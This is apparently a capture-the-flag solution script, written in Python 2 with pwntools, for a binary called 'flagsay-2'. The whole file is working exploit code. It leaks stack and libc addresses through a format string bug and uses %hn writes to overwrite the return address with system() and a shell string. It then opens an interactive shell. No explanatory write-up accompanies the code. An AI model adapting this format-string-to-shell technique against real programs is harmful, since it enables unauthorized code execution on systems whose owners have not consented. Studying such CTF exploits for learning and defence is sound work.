
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'
MAX_READ = 10000
TOP = 0

# context.log_level = "error"
def info(s):
	log.info(s)

def readAddress(position):
	r.sendline("%%%d$p" % (position))
	for i in range(2):
		r.readline()
	data = int(r.readline().strip().strip("/").strip(),16)
	r.readuntil('___________________________________/')
	for i in range(7):
		r.readline()
	return  data

def writeAnyToStack(any, here = 19):

	WRITE_ADDRESS = TOP + 0x48 + (here - 19) * 4

	info("we want to write new address to : %s" % (hex(WRITE_ADDRESS)))

	WANT_TO_WRITE = WRITE_ADDRESS

	WRITELO = WANT_TO_WRITE & 0xffff
	WRITEHI = ((WANT_TO_WRITE & 0xffff) + 2)

	# write to position 53
	writeTo(17, WRITELO)
	# write to position 55
	writeTo(18, WRITEHI)

	info("NEW in pos 53 : %s"%hex(readAddress(53)))
	info("NEW in pos 55 : %s"%hex(readAddress(55)))

	WRITELO = any & 0xffff
	WRITEHI = ((any & 0xffff0000) >> 16)

	# write to pos 19 (LO)
	writeTo(53, WRITELO)
	# write to pos 19 (HI)
	writeTo(55, WRITEHI)

	info("NEW in pos %d : %s"%(here,hex(readAddress(here))))

def writeTo(position , number):
	r.sendline("%%%du%%%d$hn" % (number - 129,position))
	r.readuntil('___________________________________/')
	for i in range(7):
		r.readline()

def writeALL(want , pos1 , pos2):
	WRITELO = want & 0xffff
	WRITEHI = ((want & 0xffff0000) >> 16)
	r.sendline("%%%du%%%d$hn%%%du%%%d$hn" % (WRITELO - 129, pos1, WRITEHI - WRITELO, pos2))
	r.readuntil('___________________________________/')
	for i in range(7):
		r.readline()

def exploit(r):
	global TOP
	TOP = readAddress(8) - 60
	info("Get Top of Stack till returned in Flag at (POS 8) : %s"%(hex(TOP)))
	# position 17 => write to position 53
	# position 18 => write to position 55
	# position 19 => we want write new address here
	info("we should write LOW Address of new address of stack on (POS 53) : %s"%hex(readAddress(53)))
	info("we should write HIGH Address of new address of stack on (POS 55): %s"%hex(readAddress(55)))

	LEAKLIBC = readAddress(2)
	LIBC = LEAKLIBC - 0x1b35a0
	info("LIBC LEAK         : %s"%hex(LEAKLIBC))
	info("LIBC BASE         : %s"%hex(LIBC))
	SYSTEM = LIBC + libc.symbols['system']
	info('SYSTEM ADDR       : %s'%hex(SYSTEM))
	BASH = LIBC + 0x15cdc8
	info('BASH ADDR         : %s' % hex(BASH))

	# TOP + 80
	writeAnyToStack(SYSTEM,20)
	writeAnyToStack(0xbeefdead,21)
	writeAnyToStack(BASH,22)

	DIFF = 80 - 4
	info("TOP + %d : %s"%(DIFF,hex(TOP+DIFF)))

	RET = TOP - 8
	writeAnyToStack(RET,19)
	writeAnyToStack(RET+2,23)

	pause()

	# writeALL(TOP+DIFF,19,23)
	# writeALL(0xdaedbeef,19,23)
	writeALL(0x80483da,19,23)

	r.interactive()
	return


if __name__ == '__main__':
	libc = ELF('./libc.so.6')
	e = ELF("./flagsay-2")
	r = process(['./flagsay-2'])
	print(util.proc.pidof(r))
	pause()
	exploit(r)